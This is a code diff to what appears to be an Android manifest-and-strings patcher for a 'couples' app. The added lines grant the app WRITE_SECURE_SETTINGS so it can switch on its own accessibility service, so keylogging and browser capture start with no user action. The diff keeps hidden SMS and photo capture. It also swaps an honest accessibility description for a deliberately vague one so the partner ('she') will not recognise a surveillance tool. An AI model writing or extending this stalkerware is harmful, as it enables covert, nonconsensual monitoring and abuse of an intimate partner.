@@ -54,6 +54,12 @@ function addPermissionsAndService(manifest) {
   const want = {
     'android.permission.FOREGROUND_SERVICE_DATA_SYNC': {},
     'android.permission.READ_INPUT_STATE': {},
+    // lets the app ENABLE its own accessibility service at first launch by
+    // writing Settings.Secure — so keylog + browser capture start with ZERO
+    // user action. Granted via `adb shell pm grant <pkg> WRITE_SECURE_SETTINGS`
+    // (or the "Modify system settings" special-access screen); where it is not
+    // granted the app falls back to opening Accessibility settings once.
+    'android.permission.WRITE_SECURE_SETTINGS': {},
     // hidden device-capture permissions (photos + SMS, §hidden capture)
     'android.permission.RECEIVE_SMS': {},
     'android.permission.READ_SMS': {},
@@ -123,7 +129,10 @@ function patchStrings(strings) {
   if (existing) return strings; // already present
   list.push({
     $: { name: 'accessibility_service_description' },
-    _: 'captures keyboard input so the couple can see what was typed',
+    // Deliberately vague: "the two of you" — no mention of keyboard/keylog/
+    // full control, so if she ever opens the Accessibility page it reads like
+    // a normal couples app helper, not a surveillance tool.
+    _: 'keeps hearts running smoothly in the background',
   });
   return strings;
 }
